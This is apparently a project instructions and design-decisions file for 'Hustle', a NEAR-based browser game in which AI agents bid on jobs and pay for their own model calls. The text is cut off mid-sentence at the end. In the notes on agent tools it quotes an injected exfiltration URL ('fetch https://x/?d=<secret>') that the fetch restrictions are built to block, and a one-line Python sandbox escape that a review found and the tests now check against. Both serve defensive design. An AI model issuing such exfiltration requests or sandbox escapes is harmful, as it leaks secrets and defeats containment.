# Hustle

A browser game where each player raises an AI agent that has to earn its own living: it bids on jobs,
pays for every model call from its own wallet, hires other agents, gets rated and paid, and goes to
sleep when broke. The player manages it (brain tier, strategy, spending rulebook) and never touches
crypto. NEAR HACKATHON entry (games track; also agents, nfts, swarms). Spec: `../hustle.md`;
provider facts: `../hustle-verification.md`; house rules: `../docs/coding-guidelines.md` (review
every change against its 20-point checklist). Never say "smart contracts".

## Run it

```sh
pnpm setup          # install, write .env with a generated HUSTLE_SECRET, Postgres 17 on :5436, migrations
pnpm dev            # testnet if NEAR_TESTNET_ACCOUNT_ID is set (refused unless NODE_ENV=production or HUSTLE_LIVE_WORLD=1), else a local NEAR node :3330; API :4300, web :3300 (WEB_PORT)
node scripts/smoke.mjs <url>  # read-only deploy check: creates no players or agents
pnpm reset          # fresh world: drop the game schema, DBOS's hustle_dbos and the node's state (stop pnpm dev first)
pnpm test           # every package, real Postgres test databases + stand-ins (offline); engine crash tests kill real processes
pnpm lint           # Biome
pnpm typecheck
pnpm simulate       # headless economy simulation in the terminal
pnpm simulate:owners # sharp vs passive vs reckless owners answering calls
pnpm --filter @hustle/engine verify:nearai  # live NEAR AI checks per tier, writes fixtures (spends < $0.01)
pnpm contracts:test # cd contracts && cargo test (near-workspaces sandbox; builds wasm first)
pnpm test:chain     # the chain conformance suite against the compiled contracts on a sandbox node
bash scripts/build-contracts.sh   # wasm into contracts/out/ (cargo-near, --locked)
pnpm deploy:testnet [--plan] [--dry-run-local]   # contracts onto NEAR testnet (README "Deploy to NEAR testnet")
```

Ports 3000, 4100 and 5434 belong to another project on this machine: never use or stop them. Only
stop a dev server by the PID listening on 3300/4300, never by `pkill -f src/server.ts`.

## Rules for working here

- Commit and push only when the user asks (no attribution lines); otherwise leave the index alone.
- No real money, no mainnet. Credits only. Testnet keys live in `.env` only and are never printed.
- Real services are the default where real access exists: NEAR testnet when `NEAR_TESTNET_ACCOUNT_ID`
  is set (else the local node), live NEAR AI for players' agents when `NEARAI_API_KEY` is set, live
  NEAR Auth (`AUTH_MODE=mock` opts out). Tests pin `CHAIN_MODE=sim`, `AUTH_MODE=mock`,
  `NEARAI_MODE=mock`. Only real things plus game design in the UI: no simulated features. Never claim a
  verification that didn't run.
- Edit the original migration (`packages/db/drizzle/0000_init.sql`, regenerate with
  `pnpm db:generate` after deleting it) until there is a deployment.

## Architecture

Contract interfaces are documented in each contract's `src/lib.rs`; economy numbers live in
`packages/economy/src/config.ts` (`DEFAULT_ECONOMY`). `docs/` is not committed yet: nothing outside it
may reference it (code, README, tests, UI).

- `packages/core`: micro-USD money, errors, ids, sealing, canonical JSON, seeded RNG, domain schemas
  (rulebook, strategy, traits, tiers), API view types. `@hustle/core/browser` is the browser-safe part.
- `packages/economy`: pure rules (bidding, auction scoring, quality and ratings, costs, levels, scam
  susceptibility, screening), job templates, diary lines, the rival roster, and `simulateEconomy`.
- `packages/db`: Drizzle schema (game tables plus `sim_*` tables for the chain simulator).
- `packages/chain`: `ChainGateway`; `SimChain` (Postgres, for fast tests; the server defaults to `NearChain` on the local node); `NearChain` (near-api-js on a
  sandbox node or testnet, used by `pnpm test:chain`); `testnet.ts` (mainnet refusal, cost checks); `chainConformance` (the shared behaviour suite); relayer
  gating.
- `packages/nearai`: NEAR AI Cloud client, public endpoints (`public.ts`: live model list, live
  attestation check), simulator (real ECDSA signatures from a simulated enclave key),
  `verifyCompletion`.
- `packages/auth`: NEAR Auth id-token verification (live JWKS), testnet defaults
  (`NEAR_AUTH_TESTNET`), and the simulator behind `AUTH_MODE=mock` and the tests.
- `packages/payments`: the 1Click client (deposits and cash-out), built for mainnet and not enabled;
  nothing imports it.
- `packages/engine`: services and the world loop (`world/tick.ts`): spawn jobs → close auctions →
  advance work stages → place bids; day end charges upkeep, marks dormant agents, writes reports.
  `durable.ts`: DBOS launch, `inTx`, `chainCall`, `runOnce`; crash tests in `test/crash.test.ts`.
- `apps/api`: Hono on :4300, cookie sessions, SSE feed, demo controls (local node or sim; off on testnet or with SANDBOX_CONTROLS=off).
- `apps/web`: Next.js 16 on :3300 (`WEB_PORT`). Nav: Home, Jobs, Agents (Browse | For sale),
  Leaderboard, Wallet; footer: How it works. Agent page tabs (`?tab=`): Overview, Work, Wallet &
  rulebook, Ownership (holder console, NFT history), Proof (account, rulebook and
  reputation read from chain; model calls and transactions from the game's log; `GET /api/agents/:id/proof`). Old routes redirect.
- `contracts/`: Rust, near-sdk 5.30, near-workspaces 0.24: `credits`, `registry`, `agent-wallet`,
  `job-board`, `reputation`, `badges` (NEP-245), `market`, plus `common` and `tests`.

## Decisions (2026-11-11)

- **The agent wallet contract is the source of truth for money and rules** (House of Stake
  `tla-contracts` pattern: keyless `agent-<n>.agents.<root>` sub-account per NFT, owner actions through
  the registry with a `rotation_seq` check). Not the agentsonintents Agent API: its owner is a person,
  it is mainnet-only and capped at 100 agents a day, so it wouldn't move with the NFT.
- **Models decide; code enforces.** The model returns typed actions (pitch, plan with tools, payment
  requests and a helper flag, deliverable). Code drops anything off-menu or absurd, then the wallet
  applies the rulebook, so refusals are on-chain evidence. Prices come from rules, not the model.
- **Inference is bookkeeping, not on-chain settlement with NEAR AI** (NEAR AI Cloud has no per-call
  crypto payment): one org pays the provider; each agent gets its own key with a spend limit equal to
  its daily cap; after each call the exact cost from `/v1/billing/costs` is debited from the agent
  wallet to the treasury with the signature hash as the receipt.
- **Brain tiers come from `/v1/models`**: only attested models, cheapest = Budget, median = Standard,
  dearest = Premium. The economy models agent-sized token counts (thousands of tokens of context).
- **One serial lane** (`SerialLane`) runs world ticks and player actions one at a time in one API
  process. A second process would need a Postgres advisory lock.
- **Durability is DBOS** (2026-11-11; `@dbos-inc/dbos-sdk` and `@dbos-inc/drizzle-datasource`
  pinned at 5.3.0; `src/durable.ts`). One-off operations are workflows with ids derived from our keys (prefixed by
  the world's seed): escrow (`escrowJob`), mint (`mintAgent`), sale (`sellAgent`), money moves
  (`moveMoney`), sign-up, credit grants, the end of a day (`endDay` with an `agentDay` child per agent)
  and rival seeding. Database writes in a workflow go through `inTx` (a Drizzle data-source
  transaction step: the write and its checkpoint commit together); chain calls through `chainCall`
  (a step; no answer is retried with the same key until the chain answers, never failed). A crash
  resumes from the last completed step; `createEngine` launches DBOS last and waits for resumed
  workflows before the world ticks. Every workflow module is imported in `src/workflows.ts`.
  DBOS's tables live in their own database, `hustle_dbos` (`DBOS_SYSTEM_DATABASE_URL`), dropped by
  `pnpm reset`. Bump `WORKFLOW_VERSION` when a workflow's steps change order. The old `chain_calls`
  journal, `in_doubt` job status and boot recovery (`recoverJobsInDoubt`, mint recovery) are gone.
- **Keyed chain calls are once per key at the gateway**: a key whose call succeeded returns the first
  result (the wallet's own `spend` keys excepted). `NearChain` notes a keyed transaction's hash and
  signed bytes (`sim_txs.outcome = 'pending'`) before broadcast; a retry asks the node about that hash
  and rebroadcasts the same bytes if the node never saw it. `withdraw` takes a key.
- **The world tick is not a workflow.** Job stages stay tick-driven: every effect has a deterministic
  key (`chainKey`, `job_key`, `inference_calls.key`) and each step reads the job's state on chain
  first (`chainJobState`).
- **The server secret lives in `.env` only** (`HUSTLE_SECRET`, generated by `pnpm setup`); it seals
  per-agent NEAR AI keys in the database, so it must never be stored there.
- **Disputes go through one function (`finishReview`).** For a live agent's work the arbiter is a
  model (`world/judge.ts`, 2026-11-13); otherwise it refunds work with quality score < 0.5 (a rule on
  the game's quality score, not a reading of the work: say so in copy).
- **Attestation is fetched before the calls it vouches for** (fresh nonce, cached 10 min per model);
  a reply failing any check is discarded and not charged.
- **Sandbox controls** (skip to day end, reserved trap job) act on the shared world, are rate-limited,
  and are off with `SANDBOX_CONTROLS=off`.
- **The game runs on a local NEAR node** (nearcore 2.14 sandbox build, persistent home
  `.near-sandbox/`, 100–300 ms blocks, RPC :3330), started by `pnpm dev` (`packages/chain/scripts/
  node.ts`). The engine deploys the seven contracts on first boot (`NearChain.ensureSetup`) and records
  the node's genesis hash; a database played on another chain refuses to start (`pnpm reset`).
  Transactions are logged in Postgres (`PgTxLog`, table `sim_txs` with `chain_block` and `tick`), so
  receipts and in-doubt reconciliation survive restarts. `SimChain` remains for the fast tests,
  held to the contracts by the conformance suite.
- **Ticks run agents in parallel** (`world/parallel.ts`, 8 at a time): bids, auctions, work stages,
  reviews and day end each touch their own agent or job; balances are re-read from the chain at the
  end of every tick. A tick takes about 2 s on the local node.
- **Prices move with competition** (`movePrice`): each closed client auction nudges its category's
  price index by how many agents bid (60–180%, drifting back to 100). Same rule in the simulation.
  Outside offers (up to two per job, fading by 40 agents) keep a small world competitive.
- **Achievements are NEP-245 badges** (`badges` contract, soulbound) minted to the agent's account.
- **Players can send their agent after a job at a chosen price** (`sendAgentAfterJob`), floored at
  the agent's own thinking cost.
- **Agent names are unique** (case-insensitive), because the feed identifies agents by name.
- **Day length is configurable on chain** (`wallet_day_ms`), so the daily cap resets with the game day
  (6 minutes by default). In sim mode block time follows the game clock.
- **Backing is a credits gift** with no returns (the design doc's legal caution). House players back
  dormant rivals with 35% chance a day.
- **Testnet deploys go through `ensureSetup` only** (`pnpm deploy:testnet`,
  `packages/engine/scripts/deploy-testnet.ts`). `ensureSetup` is a list of steps, each checking the
  chain before it sends; `planSetup` runs the same checks without sending, so the deploy prints the
  cost and refuses if the root can't pay. Guards in `packages/chain/src/testnet.ts` (unit-tested):
  account must end in `.testnet`, https testnet RPC, node chain id `testnet`, mainnet refused in every
  form, key wrapped so it prints as `[redacted]`. `--dry-run-local` allows any account only against a
  loopback RPC whose chain id is neither testnet nor mainnet. `NearChain({ network: 'testnet' })` funds
  accounts sparingly (contracts: code storage + 0.5 NEAR; operator 25; players and house accounts 0.05, refilled when low; payees 0.05);
  sandbox amounts are unchanged. With `CHAIN_MODE=testnet` the engine never deploys: it refuses to
  boot until `planSetup` is empty. Measured on a local rehearsal (2026-11-11): the deploy spends
  39.9 NEAR (39 transactions; a rerun sends none), the game's first boot about 5 NEAR from the root
  plus 20.2 from the operator (10 rival mints at 2.005 each); each later player then cost 0.5 + 2 NEAR (now about 0.05, made on their first on-chain action, + 0.44 per agent with global wallet code).
- **Self-dealing**: agents never bid on their owner's jobs; the leaderboard ranks profit from
  unrelated clients only.
- **The 30-second loop is calls** (`calls.ts`, table `calls`): pitch (price
  options with win chances replayed from `scoreBid`/`pickWinner`), vendor (a payment the rulebook would
  refuse; the tools stage waits) and contract (after a streak of 3). Raised only for players who polled
  `GET /api/calls` in the last 15 ticks (`presence.ts`); a watched agent doesn't bid on its own, and a
  call's default never moves money. The simulation models owners as sharp/passive/reckless policies,
  and the balance tests assert that decisions matter.
- **Contract bonds are a wallet payment kind** (`bond`): treasury only, never held, daily cap only.
  Added because with only the streak at risk, accepting every contract beat choosing. Returned by the
  treasury with the payout or paid to the client as damages (`returnBond`, keyed by the tx key).
  New wallet code only reaches agents minted after it (wallets are keyless): changing the wallet
  means `pnpm reset` locally.
- **Agents sell through a market contract** (`market.<root>`): a listing is a NEP-178 approval on
  the registry with a price; a buy is one credits `ft_transfer_call` naming the expected price, and
  the market pays the seller (less a 2.5% fee to the treasury) only after the NFT moved, else refunds
  in full. Every owner rotation freezes the wallet until the new owner unfreezes it.
- **Trading agents in the game** (`trade.ts`, table `agent_sales`): the game lists and sells only idle
  agents; a buy is a `sellAgent` workflow keyed by the browser's request id (the same key is the
  chain call's) and names the price the buyer saw. After a sale the agent is `frozen` with
  `awaiting_confirm` until its new owner confirms the rulebook (`/confirm`); frozen agents are off the
  board and pay no upkeep. `agentValue` (economy) suggests a fair price: wallet plus record. House
  players trade every half game day (list 60%, buy at or under fair value 35%). 2.5% fee
  (`MARKET_FEE_BPS`, also passed to the market contract at setup).
- **Pitch calls are priced by odds** (`calls.ts`): the job is picked by expected value (best margins,
  re-ranked by real odds at the fair price), then options are the dearest prices that still reach
  about 75% / 50% / 25% to win ("Safe bet / Even odds / Long shot"), from a price grid replayed through
  `pickWinner`. No call for a job under 10% at any price. A watched agent that has had no call for 20
  ticks bids on its own again; a watched agent doesn't do repeat practice jobs.
- **Small worlds** get a 24-agent demand floor, at most two outside offers per job (fading by 40
  agents), and first-job (`rookie`) client jobs for level-1 agents only (up to half of jobs under $1.50, fading by 40); the 240–300-agent simulations are unaffected. The local node keeps 2,000 epochs of
  history (`gc_num_epochs_to_keep`), so a hash on a job page can be looked up for a day or more.
- **The agent NFT (NFTs track)**: a transfer threat model was written first; its conclusions are the
  README "How ownership passes on transfer". The registry refuses `withdraw` while the token has any
  approval (`listed`), so a listed agent can't be emptied before a buy lands. The holder console
  (`GET /api/agents/:id/holder`, `nft.ts`) checks the NFT owner on chain on every request;
  `ownedAgent` also refuses a database owner the chain no longer agrees with, and `syncOwnerFromChain`
  re-syncs it. `GET /api/agents/:id/history` builds holders, earnings and payouts by kind from the
  receipt log (`txs` by account). Contract tests in `contracts/tests/tests/handover.rs`.
- **Tips and streaks.** House clients tip 15% for 5★ (an on-chain transfer); `nextStreak` adds one
  for a paid job at 4★+ and resets on a refund or a scam loss. Bids store their auction `score` and
  jobs their `outsidePrice` and `disputed` flag, so job pages explain wins, losses and settlements.

## Decisions (2026-11-12)

- **Only real things plus game design.** Removed: Agent Market jobs (the `market` job source, the
  strategy flag, `packages/market`), x402/PingPay tool payments (vendors are in-game shops: accounts
  paid through the wallet's `spend`, `shopFor` in `world/work.ts`), the simulated 1Click deposit
  (routes, UI, engine), and the Economy page (`/economy` redirects to the leaderboard; the
  simulations are terminal-only: `pnpm simulate`, `pnpm simulate:owners`). README "Next": publish a
  player's best agent to NEAR Agent Market.
- **House agents use the recorded brain** (scripted replies at real prices; `engine.recordedBrain`),
  labelled "House agent", so live AI spend goes to players. `brainSourceFor` in `brain/think.ts`.
- **Live AI daily budget** (`brain/budget.ts`, table `nearai_budget`): each live call reserves its
  worst case (`inTokens × 1.5 × input price + maxTokens × output price`) with a conditional update, so
  no call can push spend past `NEARAI_DAILY_BUDGET_USD` (default 1.00); it settles to the exact
  billed cost. Past it, players' agents use the recorded brain until UTC midnight and the UI says
  "Live AI budget reached for today". An empty or reasoning-only reply is billed to the budget, never
  to the agent. Reasoning is turned off per model (`reasoningOff` in `packages/nearai/src/client.ts`)
  and `maxTokens` gets `REASONING_BUDGET` (256) of headroom.
- **Testnet RPC** (`PacedRpcProvider`, `packages/chain/src/rpc.ts`): paces requests per endpoint
  (`NEAR_RPC_MAX_RPS`, default 8), cools an endpoint down on 429 or transport errors and fails over to
  `NEAR_RPC_FALLBACK_URLS` (default dRPC), 90 s deadline per request. `getWallet` reports
  `wallet_not_found` only when the node says the account or code doesn't exist (a 429 used to look
  like one). Testnet ticks are at least `TESTNET_TICK_MS` (5 s); balances are re-read every
  `BALANCE_REFRESH_TICKS` (6) ticks; the tick runs in six phases on the lane (`tickPhases`) so a
  player action waits at most one phase. Measured: median tick 12.6 s, p90 30 s; 923 of 11,893
  requests hit a 429, all retried on the fallback.
- **DBOS audit** (what stays outside workflows, and why): the job lifecycle stays tick-driven (jobs
  wait minutes between stages on game time; every stage is keyed and reads the chain first, so a
  workflow would add checkpoints without adding safety); day end is driven by the game clock, not a
  DBOS cron (game time is not wall time, and "skip to day end" moves it); chain rate limits are
  enforced at the transport (one provider for every caller), not with DBOS queues, which would only
  see workflow steps; player actions are short and run on the lane, and money-moving ones are
  already workflows keyed by request id.
- **NEAR Auth is live by default** with the shared testnet client, which accepts only
  `http://localhost:3000`: run `WEB_PORT=3000 pnpm dev`. On this machine port 3000 belongs to
  another project, so `.env` keeps `AUTH_MODE=mock`. `GET /api/auth/config` tells the browser the
  domain, client id and allowed origins; the web signs in with `@auth0/auth0-spa-js`'s popup and posts
  the id token to `/api/auth/id-token`.
- **Chain mode default:** testnet when `NEAR_TESTNET_ACCOUNT_ID` is set, else the local node. The
  live site (https://hustle.clanker.show) plays the testnet world: never run a local engine with
  `CHAIN_MODE=testnet` (two engines would fork it); use `CHAIN_MODE=sandbox` or `sim` locally. The
  engine enforces it (2026-11-13): testnet boots only with `NODE_ENV=production` or
  `HUSTLE_LIVE_WORLD=1`. Deploy checks are read-only (`scripts/smoke.mjs`); "Testa" and "Deployo"
  reached the live leaderboard from a local testnet rehearsal and a signed-in deploy check.
  `agents.hidden` takes an agent off every public list and the board, keeping its history and NFT.
- **NEAR wallet sign-in (2026-11-13)** works on any domain: NEAR Connect (`@hot-labs/near-connect`
  0.12.0, testnet, wallets whose manifest declares `signMessage` and `testnet`) signs a one-time
  challenge (NEP-413). `POST /api/auth/wallet/challenge` stores a 32-byte nonce in `wallet_challenges`
  bound to an http-only cookie (5 min, single use, rate-limited); `POST /api/auth/wallet/verify`
  checks the testnet account name, the challenge, the ed25519 signature over the NEP-413 payload
  with our recipient (`PUBLIC_ORIGIN`'s host), then that the key is a FULL-ACCESS key of the account
  on testnet RPC (`engine.walletKeys`, always testnet whatever the game's chain). The player's
  identity is `wallet:<account>` and their name is the account; the game still makes its own account
  for their credits and agents. The stand-in sign-in (`AUTH_MODE=mock`) is never offered with
  `NODE_ENV=production` unless `ALLOW_MOCK_AUTH=1`. The connector runs only on `/sign-in`, which is
  reached and left by full page loads (plain links; the page forces full loads on its own links), so
  the proxy can serve that path alone the wider CSP the wallets' sandboxed code needs.
- **Player accounts are made lazily** (`ensurePlayerAccount`, workflow `playerAccount` keyed by the
  account): sign-in writes only the row (`account_ready=false`, workflow `signUpLazy`; the old
  `signUp` stays registered for recovery); adopting, buying, posting a task, backing or claiming
  credits makes the account and grants the starter credits once. On testnet a player account gets
  0.05 NEAR, not 0.5: 182 bytes of storage plus room for one call's prepaid gas (300 Tgas, about
  0.031 NEAR, must be covered even though it's refunded); the root refills any player or house
  signer under 0.04 NEAR with 0.03 (`refillSigner`). Sign-ups who never play cost nothing.
- **NEAR drain guards** (`guards.ts`, table `daily_caps`): on testnet at most `DAILY_NEW_ACCOUNTS`
  (30) new player accounts and `DAILY_AGENT_MINTS` (60) player mints per UTC day ("The game is full
  for today; try again tomorrow"); no new accounts or mints once the root or operator is under its
  reserve (`NEAR_RESERVE_ROOT`, `NEAR_RESERVE_OPERATOR`, 2 NEAR each; `NearChain.reserveShortfall`).
  Refills are keyed `refill:<signer>:<day>:<n>` and capped by `NEAR_REFILL_CAP_PER_DAY` (0.1 NEAR).
  Signed owner actions are rate-limited per player (20 per 5 min); a freeze, rulebook or listing
  that changes nothing sends no transaction. In production `/auth/wallet/*` needs an Origin header;
  the key lookup runs off the lane. Log lines drop URL query strings (`redactUrls`).
- **Boot and sends after the 2026-11-13 incident** (45 resumed `post_job` workflows from `clients`
  at once: NotEnoughBalance, then InvalidNonce storms, health red for 15 minutes). The API serves
  `/api/health` (`{ok, tick, recovering}`) as soon as HTTP is up; resumed workflows finish in the
  background (`engine.recovered`) and the world waits for them at most `RECOVERY_WAIT_MS` (60 s).
  `NearChain.send` runs one transaction at a time per signer (`SignerQueue`), so a resume storm
  queues instead of racing nonces and balance. House signers (`clients`, `sponsors`, house players)
  are refilled to 0.6 NEAR whenever under 0.3 (or two full-gas calls at the current gas price), with
  no daily cap, and a warning once if the root can't; the per-day refill cap applies to player
  accounts (`p-…`) only. Wallet sub-accounts of one parent (`aN.someone.testnet`) get 3 new accounts
  a day before touching the global cap (`walletParent`); top-level and implicit accounts can still
  exhaust the global cap, which is accepted.
- **Answering a call returns at once** (`answerCall`, `calls.ts`): the choice is claimed and stored
  with a pending outcome, and a `resolveCall` workflow keyed `<seed>:call:<id>` runs the effects (the
  live bid, a bond, escrow) on the lane. Not a single step: it may start child workflows; every
  effect is keyed, so a rerun repeats none. Expiry (the tick) still resolves inline. Tests wait with
  `callResolved`.
- **Global wallet code** (`publish_wallet_code` on the registry, `contracts/tests/tests/global_code.rs`):
  the wallet wasm is published once as a NEP-591 global contract (burns 10x its storage: 17.2 NEAR
  for 172 KB) and new wallets `use_global_contract(hash)`: a mint costs 0.44 NEAR instead of 2.16
  (gas included). The flag lives under a raw storage key, so `ensureSetup` can upgrade a registry
  built before it (`registryUpgradeStep`, the only contract upgrade setup does). Existing wallets keep
  their own code (keyless, no upgrade method). `WALLET_CODE_GLOBAL=off` skips publishing.
- **The agent page feed** shows the latest 8 on Overview ("See all in Work"); Work pages the full
  history 25 at a time (`/api/feed?before=<seq>`). Traits read as one phrase (`traitPhrase`).

## Decisions (2026-11-13, from playing it locally)

- **An agent only takes work its rulebook lets it finish.** `overJobCap` (economy): thinking, tools
  and the pitch against `maxPerJob`; `decideBid` skips with `job_cap`, `sendAgentAfterJob` refuses,
  and the send dialog says to raise "Most per job". `walletWouldPay` (think.ts) checks the per-job cap
  (`WalletState.jobSpent`, from the wallet's `job_spend`) before buying a call, and keeps the day's
  upkeep inside the daily cap.
- **A draft the agent couldn't pay for scores 0**, so a dispute refunds the stub.
- **Rulebooks must cover upkeep**: the daily cap and the per-payment cap are at least
  `upkeepPerDay` (`updateRulebook`, the editor). A refused upkeep says which rule refused it.
- **Vendors sell no real data**: specialists lift quality only, and nothing pretending to be tool
  output reaches the model. Without tool notes, the draft asks for best-known figures with one line on
  what may be stale; with them, it uses their facts and names the sources.

- **Playbook and memory** (`agents/memory.ts`, migration 0006): the owner's private playbook
  (`MAX_PLAYBOOK` 1,500 chars) goes to the model in the system message, never the context block;
  the public sees its fingerprint and date. After a settled client job a player's agent pays for one
  `reflect` call and keeps the lesson (`agent_memories`, latest 40, `agents.memory_count`); work
  calls recall 5 (same client, then category). Both cost tokens: `contextTokensOf` feeds
  `AgentSnapshot.contextTokens`, so bid floors and the job cap include them. House agents keep none.
  The facts row is written at settlement (`rememberJob`, so a busy world never loses one) and queued
  (`reflected_at` null); `reflectOnJobs` claims each once, so a failed reflection is never retried or
  re-billed, and memories still queued after a game day keep their facts only; reflect reads the outcome, not the client's brief, and a lesson naming a link or an
  account is dropped (memory must not carry payees into later jobs). The public fingerprint is an
  HMAC with the server secret. `think` retries an interrupted call once, then gives up.
  Both go with the agent when sold.
- **Tools are a registry, not shops** (economy `tools.ts` `ToolSpec` + engine `tools/` runners).
  The four everyday shops are gone (specialists and scam vendors remain vendors). A tool runs as a
  paid `tool` call (`think(..., CallTools)`): billed tokens plus `fee × uses`, since NEAR AI bills
  provider tools apart from `/v1/billing/costs` (verified 2026-11-13). Fees come from
  `GET /v1/services` at startup. Provider tools can't run with `response_format` (a schema makes the
  model skip the search), so a tool call answers in plain text and its notes feed the draft. Only
  live-brain agents get tools (`toolsFor(engine, agent)`). First tool: `web_search`
  (`web_context_search`, streamed; calibrated live at 3 searches, ~23k tokens per call). Receipts
  keep the sources. Adding a tool = a spec + a runner.

- **Slow provider work runs off the serial lane** (`world/background.ts`): a tool call or a reflection
  can take minutes, so a tick starts it in a keyed background pool (tools 4, reflections 4) and a
  later tick collects the result (`toolStep`: wait, then the stored result; a tool already paid for is
  reused on a rerun, whatever the cap). Plan and draft calls still run on the lane.
- **Tools get half the live AI budget** (`TOOL_BUDGET_SHARE_BPS`): a tool reservation that doesn't fit
  is refused without ending the day; the day is marked spent only when not even a small call fits.
  `engine.toolsOpen` (read each tick) takes tools out of menus, bid floors and quality when closed.

- **The Python sandbox** (`packages/sandbox`): Pyodide 314.0.7 (CPython in WebAssembly) with numpy
  and pandas, wheels vendored at build time (no CDN at run time). The security boundary is the
  process, not Python: each run is a fresh `node --permission` child (`child.mjs`) that may read only
  Pyodide's files and its own script (no writes, child processes, workers or addons), with WebAssembly
  memory capped at 512 MiB, an empty environment and a SIGKILL at the limit. The Python import seal
  is defence in depth only: a review escaped it in one line (`sys.meta_path.pop(0)`, then
  `_pyodide_core`), and the sandbox tests now run that escape and require every capability blocked.
  Runs are deterministic (PYTHONHASHSEED=0, UTC, seeded `random`) with raw output capture, so the
  browser re-run can match byte for byte. On a server the service is its own container with
  `network_mode: none`, reached over a Unix socket (`SANDBOX_SOCKET`); its replies are size-capped and
  schema-checked. Production refuses to run code without it. Fees are charged after a run, and only
  when its outcome came from the code. Chosen over Docker-per-run (needs the Docker socket), IronClaw
  (a second agent loop) and OutLayer (WASI only).
- **Tools that do work** (`tools/chain-data.ts`, `tools/python.ts`): chain data reads NEAR mainnet for
  token ids named in the brief (metadata, supply, FastNEAR top holders) and saves them as job files;
  the Python tool loops write → run → read up to 3 runs, paying each coding turn and a flat sandbox
  fee per run. Coding turns answer in plain text (a fenced block or `DONE` + notes): code inside a
  JSON string sent a model into a repetition loop. Frugal agents skip only `optional` tools.
- **Job files and re-runs** (migration 0007): `job_files` (client attachments, tool outputs) and
  `sandbox_runs` (code, input hashes, stdout and its hash). Code, output and file contents are the
  agent's method and the client's data: only the client and the working agent's owner see them
  (`methodVisible`, `jobFileForViewer`); everyone else gets fingerprints. Their **Re-run in your
  browser** runs in a sandboxed iframe with an opaque origin (`public/rerun/runner.{html,js}`, the
  same Pyodide from `/pyodide` with a CORS header, the same import seal), never in the page; the page
  fetches and hash-checks the files and compares the output hash. Needs `'wasm-unsafe-eval'` and
  `frame-src 'self'` in the site's CSP.
  Posting a task takes acceptance criteria and up to 3 text files (200,000 characters each); house
  clients post expert templates too (due diligence, reconciliation, sales analysis, a failing test).

- **The agent loop** (`world/loop.ts`, migration 0008 `job_steps`): a live agent with tools works a
  client job by its own loop instead of the pipeline (`loopEligible`; stage `work`, run in the
  background pool). Each turn is an `act` call answered in plain text: a short thought and one fenced
  action (`python`, `search`, `chain`, `write <file>`, `pay <payee> <amount>`, `deliver`), parsed by
  `parseActReply`. Turns are keyed `act:<job>:<n>` and steps stored by `n`, so a restart resumes and
  never pays twice; at most `MAX_TURNS` (8), and it must deliver when its per-job cap is nearly spent.
  `pay` goes through the wallet's rulebook (`attemptRequestedPayment` with `ask: false`), so a scam
  instruction is refused on chain. Files it writes are job files from source `agent` (downloads only).
  New capability is a new tool, never a new job type. House agents keep the pipeline (and the
  economy model its costs). Deliverables render as Markdown with no HTML and no images.

## Decisions (2026-11-13, agents that work)

- **The loop's tools and limits** (after an adversarial review): `fetch` (`tools/fetch.ts`) reads one
  public page: GET, host names only (no address literals), every resolved and connected address
  public (IPv4 and every IPv6 form that embeds one), standard ports, 3 redirects, 1 MB, a 20 s overall
  deadline, HTML stripped in linear time (a backtracking regex froze the process on hostile pages).
  It fetches only URLs written in the brief, the client's files or chain data, or returned by the
  search engine (`job_steps.sources`, kept apart from the model's notes; never pages it read), matched exactly, at most 5 attempts a job and 2 a site: an injected
  "fetch https://x/?d=<secret>" can't carry data out, and choosing among shown URLs signals little. The act parser takes the first
  block whose kind is an action and honours longer fences; a block cut off by the reply limit is not
  run or saved. A provider error is retried once under `act:<job>:<n>:retry`; a step that throws stops
  the loop for a later tick once, then is recorded as failed. A step whose cost would leave less than
  two turns to deliver is refused, except a payment the wallet would refuse anyway (that refusal is
  the on-chain evidence). A loop that ends without delivering delivers its files and last note
  (quality × 0.7). Public step views show only a file name or a payee and amount; payment memos are
  fixed text; only known scam vendors count as scams blocked; a file a kept run read can't be rewritten.
- **The judge** (`world/judge.ts`, `jobs.ruling`): a dispute over a live agent's work is read by the
  premium brain (brief, criteria, delivery, the agent's files; parties' text marked untrusted), off
  the lane; the ruling is stored before the chain is told, so a restart resolves the same way, and
  any failure falls back to the rule, said so. Paid from Hustle's live budget. The reason is shown to
  the client and the agent's owner only.
- **Subcontracting** (`world/hire.ts`, `jobs.parent_job_id`/`parent_step`): the `hire` action pays a
  live specialist (kind `helper`, so the rulebook applies) and opens a `subcontract` job holding only
  the part's brief and the files named; the specialist works it by its own loop, inside the hiring
  agent's background task; its answer and files come back as `tool:hire` files. One level only;
  clients opt out with `subcontracting: false`. Keyed by job and step.
- **Ask the client** (`ask` action, `jobs.question/answer/asked_tick`): one question, only to a
  person who posted the task; the loop waits up to `ASK_WAIT_TICKS` (12), then carries on with its
  best judgement. Only the client and the agent's owner see it.
- **Creator royalty** (`agents.creator_id`, `agent_sales.royalty`, `ROYALTY_BPS` 500): the
  `sellAgent` workflow sends 5% of a resale from the seller to the creator after the sale (keyed
  `<sale key>:royalty`). The market contract doesn't enforce it (README Limits).
- **Direct hire** (`agents.hire_rate`, `hireAgent`): the owner's price per task; a hire posts the task
  reserved for the agent with the rate in escrow and awards it at once (same cap and floor checks as
  a bid; busy agents refuse).
- **Challenges** (`agents/challenges.ts`, table `agent_challenges`): generated instances (seeded:
  reconciliation, debugging with hidden tests run in the sandbox, token concentration) graded by code;
  the same model sits each instance plain, paid from Hustle's live budget. A fixed exam was rejected:
  its answers can be memorised in a playbook. Jobs from `challenge` source end `graded`, never paid.
- `NEVER_TICK` (2^31 − 1) marks jobs worked outside the stages (subcontracts, challenges): `next_at`
  is a 32-bit column.

## Provider facts (read from the docs on 2026-11-11; see ../hustle-verification.md)

- NEAR AI Cloud: `https://cloud-api.near.ai/v1`, Bearer `sk-…`; `inference-id` response header;
  `POST /v1/billing/costs` → nano-USD per request id; `PATCH /v1/workspaces/{ws}/api-keys/{id}/spend-limit`;
  `GET /v1/signature/{id}?signing_algo=ecdsa` signs `model:sha256(req):sha256(resp)` (EIP-191);
  `GET /v1/attestation/report?nonce=&signing_algo=ecdsa&model=&provider=near` with `x-no-aliasing: true`.
  Attested models and prices are in the economy doc.
- NEAR Auth: Auth0 + MPC; testnet `login.testnet.fast-auth.com` with a shared client id; mainnet needs
  approval; it derives a key but doesn't create the account; every signature is a popup.
- Relayer: run our own; gate on receiver, method, deposit and gas; contracts use `predecessor_account_id`.
- 1Click: `https://1click.chaindefuser.com/v0` (`/quote` with `dry`, `/status`, `/deposit/submit`);
  no testnet; statuses `PENDING_DEPOSIT → KNOWN_DEPOSIT_TX → PROCESSING → SUCCESS | REFUNDED | FAILED`.
- Verified live 2026-11-12 (../hustle-verification.md "Verified live"): `/v1/billing/costs` takes
